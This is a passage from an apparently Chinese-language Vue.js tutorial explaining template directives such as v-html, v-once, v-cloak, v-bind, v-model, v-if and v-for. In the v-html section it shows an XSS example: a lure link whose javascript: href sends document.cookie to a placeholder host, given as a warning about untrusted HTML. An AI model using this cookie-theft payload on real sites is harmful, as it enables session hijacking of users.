class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p>&#x3D;&#x3D;严重注意：v-html有安全性问题！！！&#x3D;&#x3D;</p>
<ul>
<li>在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击</li>
<li>一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上！！！</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">v-html</span>=<span class="string">&quot;str&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">str</span>:<span class="string">&#x27;&lt;a href=javascript:location.href=&quot;http://www.xxx.com?&quot;+document.cookie&gt;兄弟我找到你想要的资源了，快来！&lt;/a&gt;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144230.png" alt="  "></p>
<hr>
<p><strong>当点击这个链接就进入心怀不轨之人的圈套了！！！</strong></p>
<h2 id="4-v-once"><a href="#4-v-once" class="headerlink" title="4. v-once"></a>4. v-once</h2><p><strong>我们有时候希望展示的部分数据不会随着Vue的响应式而发生变化，就可以使用 v-once 指令。</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>会变化&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-once</span>&gt;</span>不会变化&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>v-once指令后面不需要跟任何表达式</li>
<li>v-once该指令表示元素和组件只渲染一次，不会随着数据的改变而改变，可以用于优化性能</li>
</ul>
</blockquote>
<hr>
<h2 id="5-v-pre"><a href="#5-v-pre" class="headerlink" title="5. v-pre"></a>5. v-pre</h2><p><strong>该指令的作用是用于跳过这个元素和它子元素的编译过程，用于显示原本的插值语法，一般我们的插值语法会去data里面找对应的变量然后解析，可是如果我们就想让其显示为  ，这个时候需要加 v-pre 属性，如下</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-pre</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144234.png" alt="  "></p>
<blockquote>
<ul>
<li>v-pre跳过其所在节点的编译过程。</li>
<li>v-pre可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会<code>加快编译</code></li>
</ul>
</blockquote>
<hr>
<h2 id="6-v-cloak"><a href="#6-v-cloak" class="headerlink" title="6. v-cloak"></a>6. v-cloak</h2><p><strong>在实际开发中，前端数据大多是从服务器端获取来的，如果网络不好获取的比较慢，浏览器可能会直接显示出未编译的插值标签。那么页面在渲染时可能会先显示 <code>&#123;&#123;name&#125;&#125;</code> 之后变为 <code>划水艺术家</code>。这种效果不是我们想要的，我们可以给标签添加 v-cloak 来避免这种效果。（v-cloak 与 v-text 都可以解决插值闪烁问题，但 v-text 会清楚当前元素显示的其他内通内容，但 v-cloak 不会）</strong></p>
<p><strong>v-cloak 使用流程：</strong></p>
<ul>
<li>加上v-clock 属性,并加上css。</li>
<li>vue解析之前有 v-clock 属性时，让其不显示</li>
<li>Vue解析之后没有v-clock 属性，再让其显示</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">	<span class="selector-attr">[v-cloak]</span> &#123;</span></span><br><span class="line"><span class="language-css">		<span class="attribute">display</span>: none;</span></span><br><span class="line"><span class="language-css">	&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-cloak</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// el:&quot;#root&quot;,</span></span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">	 			<span class="attr">name</span>:<span class="string">&quot;划水艺术家&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 在 2 秒后才实例化容器</span></span></span><br><span class="line"><span class="language-javascript">	<span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">		app.$mount(<span class="string">&quot;#root&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">	&#125;, <span class="number">2000</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<h1 id="四、数据绑定指令"><a href="#四、数据绑定指令" class="headerlink" title="四、数据绑定指令"></a>四、数据绑定指令</h1><p><strong>Vue中有2种数据绑定的方式：</strong></p>
<ul>
<li><strong>单向绑定（<code>v-bind</code>）</strong>：数据只能从data流向页面</li>
<li><strong>双向绑定（<code>v-model</code>）</strong>：数据不仅能从data流向页面，还可以从页面流向data</li>
</ul>
<h2 id="1-v-bind"><a href="#1-v-bind" class="headerlink" title="1. v-bind"></a>1. v-bind</h2><p>上述指令主要作用是将值插入到我们的模板的内容当中，但是，除了内容需要动态来决定外，某些属性我们也希望动态来绑定。比如：</p>
<ul>
<li>动态绑定<code>&lt;a&gt;</code>的 href 属性</li>
<li>动态绑定<code>&lt;img&gt;</code>元素的 src 属性</li>
<li>……</li>
</ul>
<p><strong>使用如下</strong>：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">v-bind:href</span>=<span class="string">&quot;url&quot;</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">   <span class="attr">el</span>: <span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">url</span>: <span class="string">&#x27;http://www.baidu.com&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">   &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144239.png" alt="  "></p>
<blockquote>
<p><strong>可以将 <code>v-bind</code> 简写为 <code>:</code></strong></p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">:href</span>=<span class="string">&quot;url&quot;</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<h2 id="2-v-model"><a href="#2-v-model" class="headerlink" title="2. v-model"></a>2. v-model</h2><p><strong>v-model可以实现：数据变化的时候, 页面会自动刷新；页面变化的时候，数据也会自动变化。</strong></p>
<p><strong>注意：</strong></p>
<blockquote>
<ul>
<li>双向绑定, 只能绑定 “文本框,单选按钮,复选框,文本域,下拉列表 ”等</li>
<li>文本框&#x2F;单选按钮&#x2F;textarea, 绑定的数据是字符串类型</li>
<li>单个复选框, 绑定的是boolean类型</li>
<li>多个复选框, 绑定的是数组</li>
<li>select单选对应字符串，多选对应是数组</li>
</ul>
</blockquote>
<h3 id="1-绑定文本框"><a href="#1-绑定文本框" class="headerlink" title="1. 绑定文本框"></a>1. 绑定文本框</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">    用户名: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;username&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="comment">//该属性值和文本框的value属性值,保持一致</span></span></span><br><span class="line"><span class="language-javascript">			<span class="attr">username</span>:<span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<h3 id="2-绑定单个复选框"><a href="#2-绑定单个复选框" class="headerlink" title="2. 绑定单个复选框"></a>2. 绑定单个复选框</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;agree&quot;</span>&gt;</span>同意<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">agree</span>:<span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144252.png" alt="  "></p>
<hr>
<h3 id="3-绑定多个复选框"><a href="#3-绑定多个复选框" class="headerlink" title="3. 绑定多个复选框"></a>3. 绑定多个复选框</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;爬山&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span>爬山<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;游泳&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span>游泳<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;篮球&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span>篮球<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">		 	<span class="comment">//数组中的值,就是被选中的元素的value属性值</span></span></span><br><span class="line"><span class="language-javascript">		 	<span class="attr">hobby</span>:[<span class="string">&quot;爬山&quot;</span>,<span class="string">&quot;游泳&quot;</span>]</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="4-v-model修饰符"><a href="#4-v-model修饰符" class="headerlink" title="4. v-model修饰符"></a>4. v-model修饰符</h3><p><strong>为了方便对用户输入的内容进行处理，Vue 为 v-model 指令提供了 3 个修饰符</strong></p>
<table>
<thead>
<tr>
<th>修饰符</th>
<th>作用</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>.number</code></td>
<td>自动将用户的输入值转化为数值类型</td>
<td><code>&lt;input v-model.number = &quot;age&quot; /&gt;</code></td>
</tr>
<tr>
<td><code>.trim</code></td>
<td>自动过滤用户输入的首尾空白字符</td>
<td><code>&lt;input v-module.trim = &quot;msg&quot; /&gt;</code></td>
</tr>
<tr>
<td><code>.lazy</code></td>
<td>在 change 时而非 input 时更新</td>
<td><code>&lt;input v-model.lazy = &quot;msg&quot; /&gt;</code></td>
</tr>
</tbody></table>
<blockquote>
<p><strong>lazy修饰符</strong> </p>
<ul>
<li>默认情况下， v-model 默认是在 input 事件中同步输入框的数据的。</li>
<li>也就是说，一旦有数据发生改变对应的 data 中的数据就会自动发生改变。</li>
<li>lazy 修饰符可以让数据在失去焦点或者回车时才会更新。</li>
</ul>
</blockquote>
<hr>
<h1 id="五、条件渲染指令"><a href="#五、条件渲染指令" class="headerlink" title="五、条件渲染指令"></a>五、条件渲染指令</h1><p><strong>条件渲染指令用来辅助开发者按需控制 DOM 的显示与隐藏 。 <code>v - if</code>、<code>v-else-if</code>、<code>v-else</code></strong><br><strong>这三个指令与JavaScript的条件语句 if、else、else if 类似，Vue 的条件指令可以根据表达式的值在DOM中渲染或销毁元素或组件</strong></p>
<h2 id="1-v-if"><a href="#1-v-if" class="headerlink" title="1. v-if"></a>1. v-if</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-if</span>=<span class="string">&quot;age &gt;= 18&quot;</span>&gt;</span>你成年了<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">age</span>: <span class="number">20</span></span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>v-if的原理：</strong></p>
<ul>
<li>v-if 后面的条件为 false时，对应的元素以及子元素不会渲染，也就是根本没有对应的标签出现在DOM中</li>
</ul>
</blockquote>
<hr>
<h2 id="2-v-else-if"><a href="#2-v-else-if" class="headerlink" title="2. v-else-if"></a>2. v-else-if</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-if</span>=<span class="string">&quot;age &gt;= 18&quot;</span>&gt;</span>你成年了<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-else-if</span>=<span class="string">&quot;age &gt;= 12&quot;</span>&gt;</span>你是个小伙子<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<h2 id="3-v-else"><a href="#3-v-else" class="headerlink" title="3. v-else"></a>3. v-else</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-if</span>=<span class="string">&quot;age &gt;= 18&quot;</span>&gt;</span>你成年了<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-else-if</span>=<span class="string">&quot;age &gt;= 12&quot;</span>&gt;</span>你是个小伙子<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-else</span>&gt;</span>你是个小学生<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="4-v-show"><a href="#4-v-show" class="headerlink" title="4. v-show"></a>4. v-show</h2><p><strong>v-show的用法和v-if非常相似，也用于决定一个元素是否渲染：</strong></p>
<ul>
<li>v-if 指令会 动态地创建或移除 DOM 元素 ，从而控制元素在页面上的显示与隐藏</li>
<li>v-show 指令会动态为元素 &#x3D;&#x3D;添加或移除 style&#x3D;“display: none;” 样式&#x3D;&#x3D; ，从而控制元素的显示与隐藏</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-show</span>=<span class="string">&quot;age &gt;= 18&quot;</span>&gt;</span>你成年了<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">age</span>: <span class="number">17</span></span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144257.png" alt="  "></p>
<hr>
<h1 id="六、列表渲染指令"><a href="#六、列表渲染指令" class="headerlink" title="六、列表渲染指令"></a>六、列表渲染指令</h1><h2 id="1-v-for"><a href="#1-v-for" class="headerlink" title="1. v-for"></a>1. v-for</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>列表渲染<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表（遍历数组）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) in persons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">				&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;</span><br><span class="line">			<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>汽车信息（遍历对象）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(value,k) in car&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;k&quot;</span>&gt;</span></span><br><span class="line">				&#123;&#123;k&#125;&#125;-&#123;&#123;value&#125;&#125;</span><br><span class="line">			<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>遍历字符串<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(char,index) in str&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">				&#123;&#123;char&#125;&#125;-&#123;&#123;index&#125;&#125;</span><br><span class="line">			<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>遍历指定次数<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(number,index) in 5&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">				&#123;&#123;index&#125;&#125;-&#123;&#123;number&#125;&#125;</span><br><span class="line">			<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">persons</span>:[</span></span><br><span class="line"><span class="language-javascript">					&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">					&#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;李四&#x27;</span>,<span class="attr">age</span>:<span class="number">19</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">					&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;王五&#x27;</span>,<span class="attr">age</span>:<span class="number">20</span>&#125;</span></span><br><span class="line"><span class="language-javascript">				],</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">car</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="attr">name</span>:<span class="string">&#x27;奥迪A8&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">					<span class="attr">price</span>:<span 